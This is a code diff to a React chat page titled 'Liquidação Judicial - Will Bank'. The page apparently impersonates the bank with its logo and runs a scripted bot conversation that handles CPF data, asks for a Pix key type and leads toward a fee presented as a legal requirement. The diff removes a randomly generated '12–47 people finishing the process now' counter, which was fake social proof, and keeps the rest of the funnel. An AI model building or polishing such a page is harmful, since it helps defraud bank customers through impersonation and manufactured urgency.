@@ -2,7 +2,7 @@ import { useEffect, useState, useRef, forwardRef, useCallback } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Mic, Paperclip, Smile, Shield, Clock, Mail, Smartphone, X, Gavel, AlertTriangle, Users } from "lucide-react";
+import { CheckCircle2, Play, Pause, Check, ArrowLeft, MoreVertical, Phone, Send, Mic, Paperclip, Smile, Shield, Clock, Mail, Smartphone, X, Gavel, AlertTriangle } from "lucide-react";
 import { CPFData } from "@/lib/cpf";
 import willbankLogo from "@/assets/willbank-logo.png";
 import {
@@ -60,7 +60,7 @@ const Chat = () => {
   const [selectedPixType, setSelectedPixType] = useState<"telefone" | "cpf" | "email" | null>(null);
   const [audioListened, setAudioListened] = useState<Set<string>>(new Set());
   const [waitingForAudio, setWaitingForAudio] = useState<string | null>(null);
-  const [onlineUsers] = useState(() => Math.floor(Math.random() * 36) + 12); // 12-47 pessoas
+  
   const [isRestoring, setIsRestoring] = useState(false);
   
   // Dialog states for popups
@@ -934,14 +934,6 @@ const Chat = () => {
     );
     await delay(2500);
 
-    await addBotMessage(
-      <div className="flex items-center gap-2 text-sm">
-        <Users className="w-4 h-4 text-green-500" />
-        <span className="text-green-600 font-medium">{onlineUsers} pessoas estão finalizando o processo neste momento</span>
-      </div>, 
-      false
-    );
-    await delay(1500);
 
     await addBotMessage(
       <div className="bg-amber-50 border border-amber-300 rounded-lg p-3">
@@ -1036,14 +1028,6 @@ const Chat = () => {
     );
     await delay(1500);
 
-    await addBotMessage(
-      <div className="flex items-center gap-2 text-sm text-muted-foreground">
-        <Users className="w-4 h-4" />
-        <span>{onlineUsers} pessoas estão finalizando o processo neste momento</span>
-      </div>, 
-      false
-    );
-    await delay(1500);
 
     await addBotMessage(<span>Clique abaixo para <strong>ENTENDER A EXIGÊNCIA LEGAL</strong>.</span>, true, 45);
     setStep("taxa-info");
@@ -1151,7 +1135,7 @@ const Chat = () => {
           <h1 className="font-bold text-sm sm:text-base truncate">Liquidação Judicial - Will Bank</h1>
           <p className="text-[10px] sm:text-xs text-slate-400 flex items-center gap-1">
             <span className="w-1.5 h-1.5 sm:w-2 sm:h-2 bg-green-500 rounded-full animate-pulse"></span>
-            {onlineUsers} pessoas online
+            Online agora
           </p>
         </div>
 
